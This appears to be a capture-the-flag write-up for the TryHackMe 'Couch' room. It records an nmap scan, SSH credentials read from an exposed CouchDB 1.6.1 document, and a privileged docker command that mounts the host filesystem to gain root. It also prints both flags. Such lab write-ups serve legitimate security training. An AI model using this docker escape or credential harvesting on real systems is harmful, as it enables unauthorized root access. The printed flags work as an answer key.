# Room: Couch

## General Info
- **Room link:** [Couch](https://tryhackme.com/room/couch)

## Description

Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge.

## Provided Files / Links
- [x] Target Machine IP (10.10.51.179)


## Enumeration / Recon
- Ports Enumeration

Basic port enumeration:
`nmap -A -p- 10.10.183.192 -T5`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Android 5.1 (93%), Linux 3.13 (93%), Linux 3.2 - 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I then found a username:password in `http://10.10.183.192:5984/_utils/document.html?secret/a1320dd69fb4570d0a3d26df4e000be7`: **atena:t4qfzcc4qN##**.

I was able to login through ssh with these credentials.

I then found a user.txt file in /home/atena: **THM{1ns3cure_couchdb}**.

I viewed the .bash_history file and found this: `docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine` => when running this command, you can have root privileges through docker and the host entire filesystem is mounted on /mnt.

After executing the command, I am root and I find the root flag in /mnt/root/root.txt: **THM{RCE_us1ng_Docker_API}**.

